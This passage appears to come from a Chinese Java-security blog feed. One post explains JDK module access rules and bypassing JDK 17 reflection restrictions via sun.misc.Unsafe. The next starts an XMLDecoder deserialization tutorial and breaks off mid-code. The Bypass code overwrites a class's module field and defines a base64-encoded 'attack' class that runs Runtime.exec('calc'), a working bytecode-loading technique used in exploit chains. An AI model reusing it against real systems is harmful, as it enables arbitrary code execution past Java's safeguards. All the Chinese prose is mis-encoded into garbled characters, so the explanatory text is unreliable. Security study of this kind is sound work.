Descriptorï¼‰</strong>ï¼šä¸€ä¸ªæ¨¡å—çš„é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸åä¸º<code>module-info.class</code>ï¼Œå®ƒå®šä¹‰äº†æ¨¡å—çš„åç§°ã€æ‰€éœ€çš„ä¾èµ–ã€æä¾›çš„æœåŠ¡ä»¥åŠå¯¹å…¶ä»–æ¨¡å—çš„ä¾èµ–ã€‚</li><li><strong>requires</strong>ï¼šåœ¨æ¨¡å—æè¿°ç¬¦ä¸­å£°æ˜æ¨¡å—ä¾èµ–ï¼ŒæŒ‡å®šå½“å‰æ¨¡å—éœ€è¦å“ªäº›å…¶ä»–æ¨¡å—ã€‚</li><li><strong>exports</strong>ï¼šå£°æ˜æ¨¡å—ä¸­çš„å“ªäº›åŒ…æ˜¯å¯ä¾›å…¶ä»–æ¨¡å—ä½¿ç”¨çš„ã€‚</li><li><strong>opens</strong>ï¼šå£°æ˜æ¨¡å—ä¸­çš„å“ªäº›åŒ…æ˜¯å¯ä¾›å…¶ä»–æ¨¡å—é€šè¿‡åå°„è®¿é—®çš„ã€‚</li><li><strong>uses</strong>ï¼šå£°æ˜æ¨¡å—éœ€è¦ä½¿ç”¨å“ªä¸ªæœåŠ¡æä¾›è€…ã€‚</li><li><strong>provides</strong>ï¼šå£°æ˜æ¨¡å—æä¾›äº†å“ªäº›æœåŠ¡å®ç°ã€‚</li><li><strong>transitive</strong>ï¼šä¾èµ–å…³ç³»çš„ä¼ é€’æ€§ï¼Œå³å¦‚æœæ¨¡å—Aä¾èµ–æ¨¡å—Bï¼Œè€Œæ¨¡å—Båˆä¾èµ–æ¨¡å—Cï¼Œé‚£ä¹ˆæ¨¡å—Aä¹Ÿéšå¼åœ°ä¾èµ–æ¨¡å—Cã€‚</li></ul><p>è¿™äº›ä¹Ÿå¯ä»¥å»çœ‹ä¸€çœ‹JDK9çš„å®˜æ–¹æ–°ç‰¹æ€§è¯´æ˜ï¼š<a href="https://docs.oracle.com/javase/9/whatsnew/toc.htm#JSNEW-GUID-C23AFD78-C777-460B-8ACE-58BE5EA681F6">https://docs.oracle.com/javase/9/whatsnew/toc.htm#JSNEW-GUID-C23AFD78-C777-460B-8ACE-58BE5EA681F6</a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹çœ‹jdk17çš„jaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241030130830178.png" alt="image-20241030130830178"></p><p>å¯ä»¥çœ‹åˆ°ä»–çš„æ¯ä¸ªæ¨¡å—éƒ½æ˜¯æœ‰module-info.classæ–‡ä»¶çš„</p><p>åœ¨JDK9æ–°å¢äº†æ¨¡å—åŒ–æœåŠ¡ä¹‹åï¼Œpublicã€protectedç­‰è®¿é—®æƒé™ä¿®é¥°ç¬¦å°±åªåœ¨è‡ªå·±çš„æ¨¡å—é‡Œé¢ç”Ÿæ•ˆï¼Œæƒ³åœ¨æ¨¡å—å¤–è¢«è¯†åˆ«çš„è¯å°±éœ€è¦ä½¿ç”¨exportså…³é”®å­—æ¥å¯¼å‡º</p><p>å¯ä»¥çœ‹çœ‹javaæœ¬èº«çš„æ–‡ä»¶æ˜¯æ€ä¹ˆå†™çš„</p><p><img src="https://cdn.clown2024.cn/image-20241030132815410.png" alt="image-20241030132815410"></p><p>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šå¸¸è§ç±»çš„å¯¼å‡ºï¼Œæ‰€ä»¥è¿™äº›å¸¸è§ç±»å¹³æ—¶æ‰èƒ½è¢«æˆ‘ä»¬è¯†åˆ«</p><p>è€Œèƒ½å¦è¢«åå°„è®¿é—®æ˜¯é€šè¿‡opensæŒ‡ä»¤æ¥å®šä¹‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æ‰¾ä¸€ä¸ªæœ‰opensæŒ‡ä»¤çš„classæ–‡ä»¶æ¥çœ‹çœ‹</p><p>æ¯”å¦‚è¿™ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241030133237491.png" alt="image-20241030133237491"></p><p>è¿™ä¸ªçš„æ„æ€å°±æ˜¯æŒ‡å®šæŸäº›ç‰¹å®šçš„æ¨¡å—æ‰èƒ½åœ¨è¿è¡Œæ—¶å¯¹è¯¥æ¨¡å—ä¸‹ç‰¹å®šåŒ…ä¸‹çš„ç±»è¿›è¡Œåå°„æ“ä½œï¼Œto åé¢è·Ÿæ¨¡å—åç§°ã€‚</p><p>åªæœ‰opens <packeage>è¡¨ç¤ºå¯¹æ‰€æœ‰æ¨¡å—å¼€æ”¾åå°„</packeage></p><p>å‰é¢çš„æ¨¡å—ä¸­å¹¶æ²¡æœ‰å¯¹java.langç­‰ç­‰çš„classè¿›è¡Œå¼€æ”¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå°±æ— æ³•åå°„è·å–å…¶épublicçš„å­—æ®µå’Œæ–¹æ³•</p><h1 id="unsafeç»•è¿‡"><a href="#Unsafeç»•è¿‡" class="headerlink" title="Unsafeç»•è¿‡"></a>Unsafeç»•è¿‡</h1><h2 id="unsafeä»‹ç»"><a href="#Unsafeä»‹ç»" class="headerlink" title="Unsafeä»‹ç»"></a>Unsafeä»‹ç»</h2><p>Unsafeæ˜¯ä½äºsun.miscåŒ…ä¸‹çš„ä¸€ä¸ªç±»ï¼Œä¸»è¦æä¾›ä¸€äº›ç”¨äºæ‰§è¡Œä½çº§åˆ«ã€ä¸å®‰å…¨æ“ä½œçš„æ–¹æ³•ï¼Œå¦‚ç›´æ¥è®¿é—®ç³»ç»Ÿå†…å­˜èµ„æºã€è‡ªä¸»ç®¡ç†å†…å­˜èµ„æºç­‰ï¼Œè¿™äº›æ–¹æ³•åœ¨æå‡Javaè¿è¡Œæ•ˆç‡ã€å¢å¼ºJavaè¯­è¨€åº•å±‚èµ„æºæ“ä½œèƒ½åŠ›æ–¹é¢èµ·åˆ°äº†å¾ˆå¤§çš„ä½œç”¨ã€‚ä½†ç”±äºUnsafeç±»ä½¿Javaè¯­è¨€æ‹¥æœ‰äº†ç±»ä¼¼Cè¯­è¨€æŒ‡é’ˆä¸€æ ·æ“ä½œå†…å­˜ç©ºé—´çš„èƒ½åŠ›ï¼Œè¿™æ— ç–‘ä¹Ÿå¢åŠ äº†ç¨‹åºå‘ç”Ÿç›¸å…³æŒ‡é’ˆé—®é¢˜çš„é£é™©ã€‚</p><p>sun.miscå’Œsun.reflectåŒ…ä¸‹çš„æˆ‘ä»¬æ˜¯å¯ä»¥æ­£å¸¸åå°„çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨åˆ°è¿™ä¸ªç±»ï¼Œå¯ä»¥åœ¨æºç ä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/image-20241030134455456.png" alt="image-20241030134455456"></p><p>æœ‰å…³Unsafeç±»çš„æ›´è¯¦ç»†ä»‹ç»å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html</a></p><p>åœ¨JDK17å‰Unsafeæ˜¯æœ‰ä¸¤ä¸ªæ–¹æ³•å¯ä»¥è¿›è¡Œå­—èŠ‚ç çš„åŠ è½½</p><p>åœ¨JDK11ä¹‹å‰<code>defineClass</code>å’Œ<code>defineAnonymousClass</code>ä¸¤ç§æ–¹æ³•å¯ä»¥åŠ è½½å­—èŠ‚ç ï¼Œåˆ°JDK11å°±åªå‰©ä¸‹<code>defineAnonymousClass</code>ä¸€ç§æ–¹æ³•ï¼Œåœ¨JDK17ä¹‹åè¿™ä¸¤ç§æ–¹æ³•å°±éƒ½è¢«ç§»é™¤äº†</p><p>æ‰€ä»¥JDK17å‰å¯ä»¥ç”¨ä¸‹é¢è¿™ç§æ–¹å¼æ¥è¿›è¡Œåå°„ç±»çš„åŠ è½½</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>unsafe.defineAnonymousClass(Class.class,bytes,<span class="hljs-literal">null</span>).newInstance();<br></code></pre></td></tr></table></figure><p>åå°„è·å–theUnsafeå­—æ®µæ˜¯å› ä¸ºè¯¥å­—æ®µæ˜¯å•ä¾‹æ¨¡å¼</p><p><img src="https://cdn.clown2024.cn/image-20241030135005733.png" alt="image-20241030135005733"></p><p>ä¸è¿‡ä¹Ÿæœ‰é™æ€æ–¹æ³•æ¥è·å–Unsafeå®ä¾‹ï¼ŒåŒæ ·æ˜¯è¿”å›theUnsafeå­—æ®µçš„å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241030135048330.png" alt="image-20241030135048330"></p><h2 id="jdk17unsafeç»•è¿‡"><a href="#JDK17Unsafeç»•è¿‡" class="headerlink" title="JDK17Unsafeç»•è¿‡"></a>JDK17Unsafeç»•è¿‡</h2><p>é‚£ä¹ˆJDK17ä¹‹åæˆ‘ä»¬è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬åå°„è°ƒç”¨épublicçš„å­—æ®µæˆ–æ–¹æ³•æ—¶ï¼Œjavaæ˜¯åœ¨setAccessiableæ–¹æ³•æ‰§è¡Œçš„æ—¶å€™æŠ›å‡ºå¼‚å¸¸çš„ï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹ä¸€ä¸‹ä»–å¼‚å¸¸æŠ›å‡ºé€»è¾‘ï¼Œç›´æ¥æ ¹æ®æŠ¥é”™çš„è°ƒç”¨æ ˆå»çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241030135950313.png" alt="image-20241030135950313"></p><p>é¦–å…ˆä»–ä¼šèµ°åˆ°checkCanSetAccessibleæ–¹æ³•ï¼Œä»æ„æ€ä¸Šä¹ŸçŸ¥é“ï¼Œå°±æ˜¯æ£€æŸ¥èƒ½å¦è®¾ç½®æƒé™çš„æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241030140555749.png" alt="image-20241030140555749"></p><p>ç„¶åä¸€è·¯èµ°åˆ°è¿™é‡Œå…·ä½“çš„åˆ¤æ–­é€»è¾‘åœ¨è¿™ï¼Œè¿™é‡Œæˆ–è·å–åå°„ç›®æ ‡çš„moduleå’Œè°ƒç”¨çš„ç±»çš„moduleï¼Œç„¶ååˆ¤æ–­ä»–ä»¬æ˜¯å¦ä¸ºåŒä¸€ä¸ªmoduleï¼Œæˆ–è€…æ˜¯å¦ä¸ºObject.classçš„moduleï¼ŒObject.classçš„moduleå°±æ˜¯<strong>java.base</strong>ï¼Œå†æˆ–è€…å°±æ˜¯ç›®æ ‡æ¨¡å—æœªå®šä¹‰æ¨¡å—å</p><p>åé¢è¿˜æœ‰ä¸€äº›ç›¸å…³çš„åˆ¤æ–­ï¼Œä½†æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„å°±æ˜¯è¿™ä¸€éƒ¨åˆ†å°±ä¸å†åˆ†æäº†</p><p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬ä¹Ÿèƒ½çŸ¥é“æˆ‘ä»¬çš„ç»•è¿‡æ€è·¯æ˜¯ä»€ä¹ˆï¼Œå°±æ˜¯ä¿®æ”¹å½“å‰ç±»çš„Moduleå’Œè¦åå°„ä¿®æ”¹çš„ç±»çš„moduleä¸€è‡´å³å¯</p><p>è€ŒUnsafeç±»å°±æä¾›äº†è¿™æ ·çš„æ–¹æ³•æ¥ä¿®æ”¹moduleæ˜¯æˆ‘ä»¬ç»•è¿‡æ£€æŸ¥ï¼Œå°±æ˜¯é€šè¿‡ä¿®æ”¹åç§»é‡ï¼Œå°†æˆ‘ä»¬çš„ç±»çš„moduleä¿®æ”¹æˆåŸºç¡€module</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Test;<br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Bypass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException, InstantiationException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAthdHRhY2suamF2YQwACgALBwAdDAAeAB8BAARjYWxjDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABmF0dGFjawEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAACAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAAAwAIAA4ACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAABgAJAAkADAAHAA0ACAAWAAoADwAAAAcAAkwHABAJAAEAEQAAAAIAEg==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(payload);<br>        Class&lt;?&gt; unSafe=Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        Field unSafeField=unSafe.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unSafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        Unsafe unSafeClass= (Unsafe) unSafeField.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//è·å–Unsafeå®ä¾‹</span><br>        <span class="hljs-comment">//è·å–ClassLoaderçš„module</span><br>        Module baseModule=Object.class.getModule();<br><br>        Class&lt;?&gt; currentClass= Bypass.class;<br>        <span class="hljs-type">long</span> addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unSafeClass.getAndSetObject(currentClass,addr,baseModule); <span class="hljs-comment">//æ›´æ”¹å½“å‰è¿è¡Œç±»çš„Module</span><br>        <span class="hljs-comment">//ç°åœ¨å°±èƒ½æ­£å¸¸åå°„äº†</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; calc= (Class&lt;?&gt;) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;attack&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030142827432.png" alt="image-20241030142827432"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p><p><a href="https://xz.aliyun.com/t/14048?time__1311=GqAxuDRD0GK7qGNPeeqBKquO1fq+fbD">https://xz.aliyun.com/t/14048?time__1311=GqAxuDRD0GK7qGNPeeqBKquO1fq%2BfbD</a></p><p><a href="https://xz.aliyun.com/t/15035?time__1311=GqjxuiqiuDgDlxGgx+xCwo4mhexcirc7=WoD">https://xz.aliyun.com/t/15035?time__1311=GqjxuiqiuDgDlxGgx%2BxCwo4mhexcirc7%3DWoD</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMLååºåˆ—åŒ–å­¦ä¹ </title>
      <link href="/2024/10/25/XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/10/25/XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="xmldecoderä»‹ç»"><a href="#XMLDecoderä»‹ç»" class="headerlink" title="XMLDecoderä»‹ç»"></a>XMLDecoderä»‹ç»</h1><p>XMLDecoderæ˜¯javaè‡ªå¸¦çš„ä»¥SAXæ–¹å¼è§£æxmlçš„ç±»ï¼Œå…¶åœ¨ååºåˆ—åŒ–ç»è¿‡ç‰¹æ®Šæ„é€ çš„æ•°æ®æ—¶å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>æ‰€è°“çš„è§£æå°±æ˜¯åœ¨javaå¯¹è±¡å’Œxmlæ–‡ä»¶ä¹‹é—´çš„è½¬åŒ–ã€‚</p><h2 id="saxæ˜¯ä»€ä¹ˆ"><a href="#SAXæ˜¯ä»€ä¹ˆ" class="headerlink" title="SAXæ˜¯ä»€ä¹ˆ"></a>SAXæ˜¯ä»€ä¹ˆ</h2><p>SAXå…¨ç§°ä¸º<code>Simple API for XML</code>ï¼Œåœ¨Javaä¸­æœ‰ä¸¤ç§åŸç”Ÿè§£æxmlçš„æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯SAXå’ŒDOMã€‚ä¸¤è€…åŒºåˆ«åœ¨äºï¼š</p><ol><li>Domè§£æåŠŸèƒ½å¼ºå¤§ï¼Œå¯å¢åˆ æ”¹æŸ¥ï¼Œæ“ä½œæ—¶ä¼šå°†xmlæ–‡æ¡£ä»¥æ–‡æ¡£å¯¹è±¡çš„æ–¹å¼è¯»å–åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤é€‚ç”¨äºå°æ–‡æ¡£</li><li>Saxè§£ææ˜¯ä»å¤´åˆ°å°¾é€è¡Œé€ä¸ªå…ƒç´ è¯»å–å†…å®¹ï¼Œä¿®æ”¹è¾ƒä¸ºä¸ä¾¿ï¼Œä½†é€‚ç”¨äºåªè¯»çš„å¤§æ–‡æ¡£</li></ol><p>SAXé‡‡ç”¨äº‹ä»¶é©±åŠ¨çš„å½¢å¼æ¥è§£æxmlæ–‡æ¡£ï¼Œç®€å•æ¥è®²å°±æ˜¯è§¦å‘äº†äº‹ä»¶å°±å»åšäº‹ä»¶å¯¹åº”çš„å›è°ƒæ–¹æ³•ã€‚</p><p>åœ¨SAXä¸­ï¼Œè¯»å–åˆ°æ–‡æ¡£å¼€å¤´ã€ç»“å°¾ï¼Œå…ƒç´ çš„å¼€å¤´å’Œç»“å°¾ä»¥åŠç¼–ç è½¬æ¢ç­‰æ“ä½œæ—¶ä¼šè§¦å‘ä¸€äº›å›è°ƒæ–¹æ³•ï¼Œä½ å¯ä»¥åœ¨è¿™äº›å›è°ƒæ–¹æ³•ä¸­è¿›è¡Œç›¸åº”äº‹ä»¶å¤„ç†ï¼š</p><ul><li>startDocument()</li><li>endDocument()</li><li>startElement()</li><li>endElement()</li><li>characters()</li></ul><h2 id="ç®€å•demo"><a href="#ç®€å•demo" class="headerlink" title="ç®€å•demo"></a>ç®€å•demo</h2><p>ä¸€ä¸ªç®€å•çš„pojoç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello, my name is &quot;</span>+name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ“ä½œç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.beans.XMLEncoder;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-comment">// åºåˆ—åŒ–å¯¹è±¡åˆ°æ–‡ä»¶person.xml</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">xmlEncode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">18</span>);<br>        person.setName(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">XMLEncoder</span> <span class="hljs-variable">xmlEncoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLEncoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        xmlEncoder.writeObject(person);<br>        xmlEncoder.close();<br>        System.out.println(<span class="hljs-string">&quot;åºåˆ—åŒ–ç»“æŸï¼&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">xmlDecode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)xmlDecoder.readObject();<br>        xmlDecoder.close();<br>        person.sayHello();<br>        System.out.println(person.getAge());<br>        System.out.println(person.getName());<br>        System.out.println(<span class="hljs-string">&quot;ååºåˆ—åŒ–æˆåŠŸ!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">Demo1</span> <span class="hljs-variable">xmlTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo1</span>();<br>        xmlTest.xmlEncode();<br>        xmlTest.xmlDecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241025133812826.png" alt="image-20241025133812826"></p><p>åºåˆ—åŒ–åçš„xmlç»“æ„</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.8.0_65&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.XMLTest.Person&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åŸºäºsaxçš„xmlè§£æ"><a href="#åŸºäºSAXçš„XMLè§£æ" class="headerlink" title="åŸºäºSAXçš„XMLè§£æ"></a>åŸºäºSAXçš„XMLè§£æ</h2><p>æ¥ä¸‹æ¥è‡ªå·±å†™ä¸€ä¸ªåŸºäºSAXçš„xmlè§£æ</p><p>æˆ‘ä»¬åªè¦è·Ÿä¸€ä¸‹æºç å°±å¯ä»¥å‘ç°å®ƒå®ç°SAXå½¢å¼æ˜¯ç»§æ‰¿DefaultHandlerç±»çš„ï¼Œè¯¥ç±»åœ¨org.xml.sax.helpersåŒ…ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241025135348967.png" alt="image-20241025135348967"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> org.xml.sax.Attributes;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><span class="hljs-keyword">import</span> org.xml.sax.helpers.DefaultHandler;<br><br><span class="hljs-keyword">import</span> javax.xml.parsers.SAXParser;<br><span class="hljs-keyword">import</span> javax.xml.parsers.SAXParserFactory;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DefaultHandler</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">saxParserFactory</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> saxParserFactory.newSAXParser();<br>            <span class="hljs-type">Demo2</span> <span class="hljs-variable">dh</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo2</span>();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;person.xml&quot;</span>;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>            parser.parse(file, dh);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">characters</span><span 